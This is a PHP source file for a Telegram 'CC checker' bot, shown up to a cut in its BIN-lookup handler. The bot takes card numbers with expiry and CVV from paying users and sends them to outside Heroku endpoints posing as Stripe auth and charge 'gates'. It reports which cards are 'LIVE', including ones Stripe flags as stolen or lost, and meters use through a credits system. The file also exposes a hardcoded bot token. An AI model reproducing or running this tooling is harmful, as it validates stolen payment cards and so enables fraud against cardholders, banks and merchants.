<?php

# ======================================================
/*
  -----------------============= [MADE BY @TorpedoX] =============-----------------
*/
# ==========================


error_reporting(0);
$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$e = print_r($update);
$info = json_encode($update,JSON_PRETTY_PRINT);

# ==========================[ OWNER INFOS ]========================

$name = 'TheFlashxD'; # YOUR USERNAME
$own_id = '756372535'; # YOUR ID
$amount = "5"; # amount you want to decrese on each live
$amount_incr = "2"; # amount to increase
# ==========================[ TOKENS ]=============================

$botToken = "1632389798:AAGhamH41LeABysgC-pIDCB44xhhG-WpB1A";
$website = "https://api.telegram.org/bot".$botToken;
$ar1 = array('www.example.com','www.exmaple2.com');  
$site = $ar1[array_rand($ar1)]; # SITE ROTATION FOR APIS IF WANT

# ==================================================================

$chatId = $update["message"]["chat"]["id"];
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$firstname = $update["message"]["from"]["first_name"];
$username = $update["message"]["from"]["username"];
$message = $update["message"]["text"];
$message_id = $update["message"]["message_id"];
$fromid = $update["message"]["reply_to_message"]["from"]["id"];
$fromuserr = $update["message"]["reply_to_message"]["from"]["username"];
$info = json_encode($update,JSON_PRETTY_PRINT);

# ==========================[ FUNCTIONS ]=============================

function sendMessage ($chatId, $message) {    
        $url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
        file_get_contents($url); 
}
function GetStr($string, $start, $end){
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
function reply_tp($chatId,$message_id,$message) {    
        $url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
        file_get_contents($url); 
}
function check_registration($real_chat,$chatid) {
  global $ch;
  $chat = $chatid;
  $ch = file_get_contents("users.txt");
  preg_match_all("/$chat/", $ch, $nnn);
  if($nnn[0][0] == $chatid) {

  }else {
    $mssg = "<b><i>USERID: <code>$chatid</code> </i></b>%0A<b><i>USERID NOT REGISTERED SEND /register TO REGISTER</i></b>";
    sendMessage($real_chat,$mssg);
    die();
  }
}
function getUsersInfos($real_chat,$chatid) {
  global $credits,$plan;
  $chat = $chatid;
  $ch = file_get_contents("users.txt");
  preg_match_all("/$chat/", $ch, $nnn);
  if(isset($nnn[1]) || $nnn[0]) {
    preg_match_all("/{USER:$chat,\nID:\[$chat\],\nCREDITS:\[(.*?)\],\nREGISTERED:\[YES\],\nPLAN\[(.*?)\],END:$chat}/", $ch, $chkk);
    $credits = $chkk[1][0];
    $plan = $chkk[2][0];
  } else {
    $mssg = "<b><i>USERID: <code>$chatid</code> </i></b>%0A<b><i>USERID NOT REGISTERED SEND /register TO REGISTER</i></b>";
    sendMessage($real_chat,$mssg);
    die();
  }
}

function check_credits($chatid,$real_chat) {
  $urname = 'TheFlashxD'; # ur name here	
  global $ch,$current_plan,$current_credits;
  $chat = $chatid;
  $ch = file_get_contents("users.txt");
  preg_match_all("/$chat/", $ch, $nnn);
  if($nnn[0][0] == $chatid) {
  	preg_match_all("/{USER:$chatid,\nID:\[$chatid\],\nCREDITS:\[(.*?)\],\nREGISTERED:\[YES\],\nPLAN\[(.*?)\],END:$chatid}/", $ch, $chkk);
	$full = $chkk[0];
	$current_credits = $chkk[1][0];
	$current_plan = $chkk[2][0];
	if ($current_plan == "PREMIUM") {
		return;
	} elseif ($current_credits <= "0") {
		$mssgg5 = "<b><i>USERID: <code>$chatid</code> </i></b>%0A<b><i>ALLOWED: YES </i></b>%0A<b><i>CREDITS: $current_credits </i></b>%0A<b><i>PLAN: $current_plan </i></b>%0A<b>NOT ENOUGH CREDITS CONTACT @$urname </b>";
  		sendMessage($real_chat,$mssgg5);
  		die();
	}
  }else {
    $mssg = "<b><i>USERID: <code>$chatid</code> </i></b>%0A<b><i>USERID NOT REGISTERED SEND /register TO REGISTER</i></b>";
    sendMessage($chatid,$mssg);
    die();
  }
}

function reduce_on_lives($userid,$amount,$real_chat) {
	$ch = file_get_contents("users.txt");
	preg_match_all("/{USER:$userid,\nID:\[$userid\],\nCREDITS:\[(.*?)\],\nREGISTERED:\[YES\],\nPLAN\[(.*?)\],END:$userid}/", $ch, $chkk);
	$full = $chkk[0];
	$current_credits = $chkk[1][0];
	$current_plan = $chkk[2][0];
	if ($current_plan == "PREMIUM") {
		return;
	}
	$reduced = $current_credits - $amount;
	$repl1 = str_replace("{USER:$userid,\nID:[$userid],\nCREDITS:[$current_credits],\nREGISTERED:[YES],\nPLAN[$current_plan],END:$userid}", "{USER:$userid,\nID:[$userid],\nCREDITS:[$reduced],\nREGISTERED:[YES],\nPLAN[$current_plan],END:$userid}", $ch);
	if ($repl1 != "") {
	  $opne = fopen("users.txt", "w") or die();
	  fwrite($opne, $repl1);
	  fclose($opne);
	  die();
	} else {
	  die();
	}
}
function increse_credits($userid,$amount,$real_chat) {
	$ch = file_get_contents("users.txt");
	preg_match_all("/{USER:$userid,\nID:\[$userid\],\nCREDITS:\[(.*?)\],\nREGISTERED:\[YES\],\nPLAN\[(.*?)\],END:$userid}/", $ch, $chkk);
	$full = $chkk[0];
	$current_credits = $chkk[1][0];
	$current_plan = $chkk[2][0];
	# if want this incase if credits in - negative so replace with 0 then add credits
	/*if ($current_credits < "0") {
		$current_credits = "0";
	}*/
	$increased = $current_credits + $amount;
	$repl1 = str_replace("{USER:$userid,\nID:[$userid],\nCREDITS:[$current_credits],\nREGISTERED:[YES],\nPLAN[$current_plan],END:$userid}", "{USER:$userid,\nID:[$userid],\nCREDITS:[$increased],\nREGISTERED:[YES],\nPLAN[$current_plan],END:$userid}", $ch);
	if ($repl1 != "") {
	  $opne = fopen("users.txt", "w") or die();
	  fwrite($opne, $repl1);
	  fclose($opne);
	  die();
	} else {
	  die();
	}
}
function checkaccess($chatc) {
  $urname = 'TheFlashxD'; # ur name here	
  $ch = file_get_contents("allowss.txt");
  $check = explode(",", $ch);
  if(!in_array($chatc, $check)) {
   $nq = "<b>Sed😭 it seems like you aren't authorized to use me dm my master</b> @TheFlashxD<b> to ask for permission</b>";
    sendMessage($chatc,$nq);die();
  }
}
# ==========================[ START ]=============================
switch($message) {
	case "/start":
	    

	$ch = file_get_contents("allowss.txt");
 	$check = explode(",", $ch);
 	if(!in_array($chatId, $check)) {
   	$nq = "<b>Welcome</b> $firstname <i>Im Monkey D Luffy, A bot created by @TheFlashxD</i> Send /cmds to get a list of working commands";
    reply_tp($chatId,$message_id,$nq);die();
  	}else {
  	$nq = "<b><i>Welcome <code>@$username</code></i></b>%0A<b><i>USERID: <code>$chatId</code></i></b>%0A<b><i>STATUS: ALLOWED IN BOT</i></b>";
    reply_tp($chatId,$message_id,$nq);die();
  	}

    break;
    case "/cmds":

    $cmd_message = '<b>AVAILABLE COMMANDS</b>%0A%0A<b>🔆STRIPE AUTH GATE🔆</b>%0A<code>/fxd .fxd !fxd</code>%0AExample <code>/fxd cc|mm|yy|cvv</code>%0A<b>🔆ACCESS TO BOT🔆</b>%0AType <code>/register</code>%0A<b>🔅ABOUT YOU🔅%0A</b>Type <code>/info</code>%0A<b>🔅STRIPE CHARGE🔅</b>%0A<code>/fxc cc|mm|yy|cvv</code>%0A<b>🔆BIN LOOK UP🔆</b>%0A<code>/bin 414398</code>%0A<b>🔆SK CHECKER🔆</b>%0A<code>/sk sk_live_xx</code>%0A%0ABot By <code>[🇿🇦] Flash↯KidƊ</code>';
    reply_tp($chatId,$message_id, $cmd_message);

    break;
    case "/info":

    if (isset($fromid)) {
	$infos = "%0A<u>USERID: </u><b><code>".$userId."</code></b> | <u>USERNAME: </u><b>".$username."</b>%0A<u>FROMID: </u><b><code>".$fromid."</code></b> | <u>FROMUSER: </u><b>".$fromuserr."</b>%0A<u>CHATID: </u><b><code>".$chatId."</code></b>";
	reply_tp($chatId,$message_id,$infos);
	die();
	}else {
	$infos = "%0A<b><u>Name:</u></b> $firstname%0A<b><u>Username:</u></b> @$username%0A<b><u>UserID:</u></b> <code>$userId</code>";
	reply_tp($chatId,$message_id,$infos);
	die();
	}

    break;
    }

# ==========================[ ADMIN-COMMANDS ]=============================

#  /allow (userid or chatid) to authorize chat or user in bot e.g /allow 12345653
# /block (userid or chatid) to block someone from bot e.g /block 123456
# /add to add credits to user e.g /add 1244523|20 or /add 1242523|20|FREE if want to change plan aswell    
# /get to get user info of registered user e.g /get 12324532
# /min to reduce credits and chan plan if want (id)|(amount)|(plan) e.g /min 12345|20 or /min 12344|20|FREE if want change plan



if(strpos($message, "/allow") === 0) {

	if ($userId == $own_id) {
		$id = substr($message, 7);
		$urc = file_get_contents("allowss.txt");
		$uchk = explode(",", $urc);
		if (in_array($id, $uchk)) {
			$mss1 = "<b><i>User already allowed in bot </i></b>";
			reply_tp($chatId,$message_id, $mss1);die();
		}else {
			$ope = fopen("allowss.txt", "a") or die();
		    fwrite($ope, $id);
		    fwrite($ope, ",");
		    fclose($ope);
		    $dnee = "<b><i>User: <code>$id</code> Successfully Granted Access</i></b>";
		    reply_tp($chatId,$message_id, $dnee);die();
		}
	} else {
		$mss = "<b><i>YOU ARE NOT ALLOWED TO USE THIS COMMAND</i></b>";
   		reply_tp($chatId,$message_id, $mss);die();
	}
}

elseif(strpos($message, "/block") === 0) {

	if($userId == $own_id) {
		  $id = substr($message, 7);
		  $uchh = file_get_contents("allowss.txt");
		  $che3 = explode(",", $uchh);
		  if(in_array($id, $che3)) {
		    $idcjj = $id.",";
			$uchh = str_replace($idcjj, "", $uchh);
			$opne = fopen("allowss.txt", "w") or die();
			fwrite($opne, $uchh);
			fclose($opne);
			$dnee = "<b><i>User: <code>$id</code> Blocked Successfully</i></b>";
		 	sendMessage($chatId, $dnee);die();

		  } else {
		    $mss1 = "<b><i>User Does Not Exist</i></b>";
		    sendMessage($chatId, $mss1);die();
		  }

		} else {
			$mss = "<b><i>YOU ARE NOT ALLOWED TO USE THIS COMMAND</i></b>";
   			sendMessage($chatId, $mss);die();
		}
}

elseif (strpos($message, "/add") === 0){

# /add to add credits to user (id)|(amount)|(plan) e.g /add 1244523|20 or /add 1242523|20|FREE if want to change plan aswell


	if ($userId != $own_id) {
 	   $mssg = "<b><i>YOU ARE NOT ALLOWED TO USE THIS COMMAND</i></b>";
  	   reply_tp($chatId,$message_id,$mssg);die();
	}
	$usere = substr($message, 5);
	$expp = explode("|", $usere);
	$idd = $expp[0];
	$amount = $expp[1];
	$plan = $expp[2];
	check_registration($chatId,$idd);
	preg_match_all("/{USER:$idd,\nID:\[$idd\],\nCREDITS:\[(.*?)\],\nREGISTERED:\[YES\],\nPLAN\[(.*?)\],END:$idd}/", $ch, $chkk);
	$full = $chkk[0];
	$current_credits = $chkk[1][0];
	$newcredits = $current_credits + $amount;
	$current_plan = $chkk[2][0];
	$repl1 = str_replace("{USER:$idd,\nID:[$idd],\nCREDITS:[$current_credits],\nREGISTERED:[YES],\nPLAN[$current_plan],END:$idd}", "{USER:$idd,\nID:[$idd],\nCREDITS:[$newcredits],\nREGISTERED:[YES],\nPLAN[".($plan != '' ? ''.$plan.'' : ''.$current_plan.'')."],END:$idd}", $ch);
	if ($repl1 != "") {
	  $opne = fopen("users.txt", "w") or die();
	  fwrite($opne, $repl1);
	  fclose($opne);
	  $msssg4 = "<b><i>USERID: <code>$idd</code></i></b>%0A<b><i>HAS BEEN CREDITED $amount SUCESSFULLY</i></b>";
	  reply_tp($chatId,$message_id,$msssg4);
	  die();
	} else {
	   $msssg4 = "<b><i>ERROR</i></b>";
	  sendMessage($chatId,$msssg4);
	  die();
	}
}

elseif (strpos($message, "/get") === 0){

# /get to get user info of registered user e.g /get 12324532

  if ($userId != $own_id) {
 	$mssg = "<b><i>YOU ARE NOT ALLOWED TO USE THIS COMMAND</i></b>";
  	reply_tp($chatId,$message_id,$mssg);die();
  }
  $usere = substr($message, 5);
  getUsersInfos($chatId,$usere);
  $mssgg5 = "<b><i>USERID: <code>$usere</code> </i></b>%0A<b><i>ALLOWED: YES </i></b>%0A<b><i>CREDITS: $credits </i></b>%0A<b><i>PLAN: $plan </i></b>";
  reply_tp($chatId,$message_id,$mssgg5);die();

}

elseif (strpos($message, "/min") === 0){

# /min to reduce credits and chan plan if want (id)|(amount)|(plan) e.g /min 12345|20 or /min 12344|20|FREE if want change plan
  	if ($userId != $own_id) {
 		$mssg = "<b><i>YOU ARE NOT ALLOWED TO USE THIS COMMAND</i></b>";
  		sendMessage($chatId,$mssg);die();
 	 }
  	$usere = substr($message, 5);
	$expp = explode("|", $usere);
	$idd = $expp[0];
	$amount = $expp[1];
	$plan = $expp[2];
	check_registration($chatId,$idd);
	preg_match_all("/{USER:$idd,\nID:\[$idd\],\nCREDITS:\[(.*?)\],\nREGISTERED:\[YES\],\nPLAN\[(.*?)\],END:$idd}/", $ch, $chkk);
	$full = $chkk[0];
	$current_credits = $chkk[1][0];
	$newcredits = $current_credits - $amount;
	$current_plan = $chkk[2][0];
	$repl1 = str_replace("{USER:$idd,\nID:[$idd],\nCREDITS:[$current_credits],\nREGISTERED:[YES],\nPLAN[$current_plan],END:$idd}", "{USER:$idd,\nID:[$idd],\nCREDITS:[$newcredits],\nREGISTERED:[YES],\nPLAN[".($plan != '' ? ''.$plan.'' : ''.$current_plan.'')."],END:$idd}", $ch);
	if ($repl1 != "") {
	  $opne = fopen("users.txt", "w") or die();
	  fwrite($opne, $repl1);
	  fclose($opne);
	  $msssg4 = "<b><i>USERID: <code>$idd</code> </i></b>%0A<b><i>DEDUCTED $amount SUCESSFULLY </i></b>";
	  sendMessage($chatId,$msssg4);
	  die();
	} else {
	   $msssg4 = "<b><i>ERROR</i></b>";
	  sendMessage($chatId,$msssg4);
	  die();
	}

}
# ==========================[ REGISTERATION ]=================================
elseif($message == "/register") {
	$ch = file_get_contents("users.txt");
	preg_match_all("/$userId/", $ch, $nnn);
	if(isset($nnn[1]) || $nnn[0]) {
	  $msgg = "<b><i>USERID: <code>$userId</code> </i></b>%0A<b><i>ALREADY REGISTERED</i></b>";
	  reply_tp($chatId,$message_id,$msgg);die();
	}else {
	  $op = fopen("users.txt", "a");
	  $towrite = "{USER:$userId,\nID:[$userId],\nCREDITS:[0],\nREGISTERED:[YES],\nPLAN[FREE],END:$userId}\n\n";
	  fwrite($op, $towrite);
	  fclose($op);
	  $msgg = "<b><i>USERID: <code>$userId</code> </i></b>%0A<b><i>REGISTRATION SUCESSFULL</i></b>";
	  reply_tp($chatId,$message_id,$msgg);die();
	}
}
# ==========================[ GATES ]=================================

#========================skkey================
elseif ((strpos($message, "!fxd") === 0)||(strpos($message, "/fxd") === 0)||
(strpos($message,".fxd") === 0)){

checkaccess($chatId); 
check_credits($userId,$chatId);
$lista = substr($message, 5);

$binchk = substr($lista, 0,7);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$binchk.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = getStr($fim, '"bank":{"name":"', '"');
$country = getStr($fim, '"name":"', '"');
$brand = getStr($fim, '"brand":"', '"');
$country = getStr($fim, '"country":{"name":"', '"');
$alpha2 = getStr($fim, '"alpha2":"','"');
$scheme = getStr($fim, '"scheme":"', '"');
$currency = getStr($fim, '"currency":"', '"');
$emoji = getStr($fim, '"emoji":"', '"');
$type = getStr($fim, '"type":"', '"');
$prepaid = getStr($fim, '"prepaid":',',"');
if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}






$ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://flashkiddxd.herokuapp.com/api2.php?lista='.$lista.'');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 $result = curl_exec($ch);
 $info = curl_getinfo($ch);
$respf = trim(strip_tags(getStr($result, 'RESPONE[','],')));
if ($respf == "incorrect_cvc") {
	$resp = '<b>✅ STRIPE AUTH - LIVE</b>%0A<u>CC</u>: <code>'.$lista.'</code>%0A<b><u>Status</u></b>: <b>❇️ CCN LIVE ❇️ </b>%0A<u>Response</u>: <b>'.$respf.' </b>%0A<b>———»BinData«———</b>%0A<u>Country</u>: <b>'.$country.' '.$emoji.'</b>%0A<u>Bank</u>: <b>'.$bank.' '.$type.' '.$brand.'</b>%0A<u>Checked by</u>: @'.$username.'%0A<u>Stats: </u><b>['.$current_plan.']</b>%0A<b>Bot by</b>: <code>[🇿🇦] Flash↯KidƊ</code>';
	reply_tp($chatId,$message_id,$resp);
}elseif ($respf == "insufficient_funds") {
	$resp = '<b>✅ STRIPE AUTH - LIVE</b>%0A<u>CC</u>: <code>'.$lista.'</code>%0A<b><u>Status</u></b>: <b>❇️ CVV LIVE ❇️ </b>%0A<u>Response</u>: <b>Insufficient Balance </b>%0A<b>———»BinData«———</b>%0A<u>Country</u>: <b>'.$country.' '.$emoji.'</b>%0A<u>Bank</u>: <b>'.$bank.' '.$type.' '.$brand.'</b>%0A<u>Checked by</u>:@'.$username.'%0A<u>Stats: </u><b>['.$current_plan.']</b>%0A<b>Bot by</b>: <code>[🇿🇦] Flash↯KidƊ</code>';
	reply_tp($chatId,$message_id,$resp);
	reply_tp($chatId,$message_id,$resp);
}elseif ($respf == "lost_card") {
	$resp = '<b>✅ STRIPE AUTH - LIVE</b>%0A<u>CC</u>: <code>'.$lista.'</code>%0A<b><u>Status</u></b>: <b>❇️ CCN LIVE ❇️ </b>%0A<u>Response</u>: <b>'.$respf.' </b>%0A<b>———»BinData«———</b>%0A<u>Country</u>: <b>'.$country.' '.$emoji.'</b>%0A<u>Bank</u>: <b>'.$bank.' '.$type.' '.$brand.'</b>%0A<u>Checked by</u>: @'.$username.'%0A<u>Stats: </u><b>['.$current_plan.']</b>%0A<b>Bot by</b>: <code>[🇿🇦] Flash↯KidƊ</code>';
reply_tp($chatId,$message_id,$resp);
}elseif ($respf == "stolen_card") {
	$resp = '<b>✅ STRIPE AUTH - LIVE</b>%0A<u>CC</u>: <code>'.$lista.'</code>%0A<b><u>Status</u></b>: <b>❇️ CCN LIVE ❇️ </b>%0A<u>Response</u>: <b>'.$respf.' </b>%0A<b>———»BinData«———</b>%0A<u>Country</u>: <b>'.$country.' '.$emoji.'</b>%0A<u>Bank</u>: <b>'.$bank.' '.$type.' '.$brand.'</b>%0A<u>Checked by</u>: @'.$username.'%0A<u>Stats: </u><b>['.$current_plan.']</b>%0A<b>Bot by</b>: <code>[🇿🇦] Flash↯KidƊ</code>';
	reply_tp($chatId,$message_id,$resp);
}elseif ($respf == "pass") {
	$resp = '<b>✅ STRIPE AUTH - LIVE</b>%0A<u>CC</u>: <code>'.$lista.'</code>%0A<b><u>Status</u></b>: <b>❇️ CVV LIVE ❇️ </b>%0A<u>Response</u>: <b>'.$respf.' </b>%0A<b>———»BinData«———</b>%0A<u>Country</u>: <b>'.$country.' '.$emoji.'</b>%0A<u>Bank</u>: <b>'.$bank.' '.$type.' '.$brand.'</b>%0A<u>Checked by</u>: @'.$username.'%0A<u>Stats: </u><b>['.$current_plan.']</b>%0A<b>Bot by</b>: <code>[🇿🇦] Flash↯KidƊ</code>';
	reply_tp($chatId,$message_id,$resp);
}elseif($respf == "testmode_charges_only") {
	$resp = '<b>❌ STRIPE AUTH - DEAD</b>%0A<u>CC</u>: <code>'.$lista.'</code>%0A<b><u>Status</u></b>: <b>🚫 SK DEAD 🚫 </b>%0A<u>Response</u>: <b>'.$respf.' </b>%0A<b>———»BinData«———</b>%0A<u>Country</u>: <b>'.$country.' '.$emoji.'</b>%0A<u>Bank</u>: <b>'.$bank.' '.$type.' '.$brand.'</b>%0A<u>Checked by</u>: @'.$username.'%0A<u>Stats: </u><b>['.$current_plan.']</b>%0A<b>Bot by</b>: <code>[🇿🇦] Flash↯KidƊ</code>';
	reply_tp($chatId,$message_id,$resp);
}elseif ($respf == "invalid_request_error") {
	$resp = '<b>❌ STRIPE AUTH - DEAD</b>%0A<u>CC</u>: <code>'.$lista.'</code>%0A<b><u>Status</u></b>: <b>🚫 INVALID REQUEST 🚫 </b>%0A<u>Response</u>: <b>'.$respf.' </b>%0A<b>———»BinData«———</b>%0A<u>Country</u>: <b>'.$country.' '.$emoji.'</b>%0A<u>Bank</u>: <b>'.$bank.' '.$type.' '.$brand.'</b>%0A<u>Checked by</u>: @'.$username.'%0A<u>Stats: </u><b>['.$current_plan.']</b>%0A<b>Bot by</b>: <code>[🇿🇦] Flash↯KidƊ</code>';
	reply_tp($chatId,$message_id,$resp);
}elseif ($respf == "cvv") {
	$resp = '<b>✅ STRIPE AUTH - LIVE</b>%0A<u>CC</u>: <code>'.$lista.'</code>%0A<b><u>Status</u></b>: <b>❇️ CVV LIVE ❇️ </b>%0A<u>Response</u>: <b>Approved! </b>%0A<b>———»BinData«———</b>%0A<u>Country</u>: <b>'.$country.' '.$emoji.'</b>%0A<u>Bank</u>: <b>'.$bank.' '.$type.' '.$brand.'</b>%0A<u>Checked by</u>:@'.$username.'%0A<u>Stats: </u><b>['.$current_plan.']</b>%0A<b>Bot by</b>: <code>[🇿🇦] Flash↯KidƊ</code>';
	reply_tp($chatId,$message_id,$resp);
}elseif ($respf == "Sending credit card numbers directly to the Stripe API is generally unsafe.") {

	$resp = '<b>❌ STRIPE AUTH - DEAD</b>%0A<u>CC</u>: <code>'.$lista.'</code>%0A<b><u>Status</u></b>: <b>🚫 INTEGRATION OFF 🚫 </b>%0A<u>Response</u>: <b>'.$respf.' </b>%0A<b>———»BinData«———</b>%0A<u>Country</u>: <b>'.$country.' '.$emoji.'</b>%0A<u>Bank</u>: <b>'.$bank.' '.$type.' '.$brand.'</b>%0A<u>Checked by</u>: @'.$username.'%0A<u>Stats: </u><b>['.$current_plan.']</b>%0A<b>Bot by</b>: <code>[🇿🇦] Flash↯KidƊ</code>';
	reply_tp($chatId,$message_id,$resp);
}
 else{
	$resp = '<b>❌ STRIPE AUTH - DEAD</b>%0A<u>CC</u>: <code>'.$lista.'</code>%0A<b><u>Status</u></b>: <b>🚫 DECLINED 🚫 </b>%0A<u>Response</u>: <b>'.$respf.' </b>%0A<b>———»BinData«———</b>%0A<u>Country</u>: <b>'.$country.' '.$emoji.'</b>%0A<u>Bank</u>: <b>'.$bank.' '.$type.' '.$brand.'</b>%0A<u>Checked by</u>: @'.$username.'%0A<u>Stats: </u><b>['.$current_plan.']</b>%0A<b>Bot by</b>: <code>[🇿🇦] Flash↯KidƊ</code>';
	reply_tp($chatId,$message_id,$resp);
}


reduce_on_lives($userId,$amount,$chatId); # remove if dont want this

}


#==================[Charge Gate Stripe]====================
elseif (strpos($message, "/fxc") === 0||strpos($message, "!fxc") === 0){

checkaccess($chatId); 
check_credits($userId,$chatId);
$lista = substr($message, 5);

$binchk = substr($lista, 0,7);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$binchk.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = getStr($fim, '"bank":{"name":"', '"');
$country = getStr($fim, '"name":"', '"');
$brand = getStr($fim, '"brand":"', '"');
$country = getStr($fim, '"country":{"name":"', '"');
$alpha2 = getStr($fim, '"alpha2":"','"');
$scheme = getStr($fim, '"scheme":"', '"');
$currency = getStr($fim, '"currency":"', '"');
$emoji = getStr($fim, '"emoji":"', '"');
$type = getStr($fim, '"type":"', '"');
$prepaid = getStr($fim, '"prepaid":',',"');
if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}






$ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://flashkiddxd.herokuapp.com/api1.php?lista='.$lista.'');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 $result = curl_exec($ch);
 $info = curl_getinfo($ch);
$respf = strip_tags(getStr($result, 'RESPONE[','],'));
if (strpos($result, "invalid_cvc")) {
	$resp = '<b>✅ STRIPE AUTH - LIVE</b>%0A<u>CC</u>: <code>'.$lista.'</code>%0A<b><u>Status</u></b>: <b>CCN LIVE❤️ </b>%0A<u>Response</u>: <b>'.$respf.' </b>%0A<b>———»BinData«———</b>%0A<u>Country</u>: <b>'.$country.' '.$emoji.'</b>%0A<u>Bank</u>: <b>'.$bank.' '.$type.' '.$brand.'</b>%0A<u>Checked by</u>: @'.$username.'%0A<u>Stats: </u><b>['.$current_plan.']</b>%0A<b>Bot by</b>: <code>[🇿🇦] Flash↯KidƊ</code>';
	reply_tp($chatId,$message_id,$resp);
}elseif (strpos($result, "cvv_not_charged")) {
	$resp = '<b>✅ STRIPE CHARGE - LIVE</b>%0A<u>CC</u>: <code>'.$lista.'</code>%0A<b><u>Status</u></b>: <b>CVV MATCH</b>%0A<u>Response</u>: <b>INSUFFICIENT FUNDS</b>%0A<b>———»BinData«———</b>%0A<u>Country</u>: <b>'.$country.' '.$emoji.'</b>%0A<u>Bank</u>: <b>'.$bank.' '.$type.' '.$brand.'</b>%0A<u>Checked by</u>: @'.$username.'%0A<u>Stats: </u><b>['.$current_plan.']</b>%0A<b>Bot by</b>: <code>[🇿🇦] Flash↯KidƊ</code>';
	reply_tp($chatId,$message_id,$resp);
}elseif (strpos($result, "cvv_charged")) {
	$resp = '<b>✅ STRIPE CHARGE - LIVE</b>%0A<u>CC</u>: <code>'.$lista.'</code>%0A<b><u>Status</u></b>: <b>CVV MATCH </b>%0A<u>Response</u>: <b>Charged Successfully💸 </b>%0A<b>———»BinData«———</b>%0A<u>Country</u>: <b>'.$country.' '.$emoji.'</b>%0A<u>Bank</u>: <b>'.$bank.' '.$type.' '.$brand.'</b>%0A<u>Checked by</u>:@'.$username.'%0A<u>Stats: </u><b>['.$current_plan.']</b>%0A<b>Bot by</b>: <code>[🇿🇦] Flash↯KidƊ</code>';
	reply_tp($chatId,$message_id,$resp);
}elseif (strpos($result, "fraudulent, LIVE")) {
	$resp = '<b>✅ STRIPE CHARGE - LIVE</b>%0A<u>CC</u>: <code>'.$lista.'</code>%0A<b><u>Status</u></b>: <b>CVV MATCH🟡 </b>%0A<u>Response</u>: <b>'.$respf.' </b>%0A<b>———»BinData«———</b>%0A<u>Country</u>: <b>'.$country.' '.$emoji.'</b>%0A<u>Bank</u>: <b>'.$bank.' '.$type.' '.$brand.'</b>%0A<u>Checked by</u>: @'.$username.'%0A<u>Stats: </u><b>['.$current_plan.']</b>%0A<b>Bot by</b>: <code>[🇿🇦] Flash↯KidƊ</code>';
	reply_tp($chatId,$message_id,$resp);
}else{
	$resp = '<b>❌ STRIPE CHARGE - DEAD</b>%0A<u>CC</u>: <code>'.$lista.'</code>%0A<b><u>Status</u></b>: <b>DEAD </b>%0A<u>Response</u>: <b>'.$respf.' </b>%0A<b>———»BinData«———</b>%0A<u>Country</u>: <b>'.$country.' '.$emoji.'</b>%0A<u>Bank</u>: <b>'.$bank.' '.$type.' '.$brand.'</b>%0A<u>Checked by</u>: @'.$username.'%0A<u>Stats: </u><b>['.$current_plan.']</b>%0A<b>Bot by</b>: <code>[🇿🇦] Flash↯KidƊ</code>';
	reply_tp($chatId,$message_id,$resp);
}


reduce_on_lives($userId,$amount,$chatId); # remove if dont want this

}


elseif ((strpos($message, "/bin") === 0) || ((strpos($message, "!bin") === 0))){



$bin = substr($message, 5 ,6);
$count = strlen($bin);
if ($count < 6) {

  $response = ' <b>%0AWrong Data @'.$username.' Send Atleast Six Digits</b>';
  reply_tp($chatId,$message_id,$response);die();
}

else {

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$res = curl_exec($ch);
if ($res == "") {
  $mssg = "<b><i>BIN NOT VALID/NOT FOUND</i></b>";
  reply_tp($chatId,$message_id,$mssg);
  die(); 
}
$js = json_decode($res,true);


$type = $js['type'];
$brand = $js['brand'];
$prepaid = $js['prepaid'];
$country = $js['country']['name'];
$emoji = $js['country']['emoji'];
$currency = $js['country']['currency'];
$bank = $js['bank']['name'];
$bank_url = $js['bank']['url'];
$bphone = $js['bank']['phone'];
if ($prepaid == 1) {
  $prepaid = "YES";
}else { 
  $prepaid = "NO";
}
if ($bank == "") {
  $bank = "NO DATA";
}
if ($bank_url == "") {
  $bank_url = "NO DATA";
}
if ($bphone == "") {
  $bphone = "NO DATA";
}
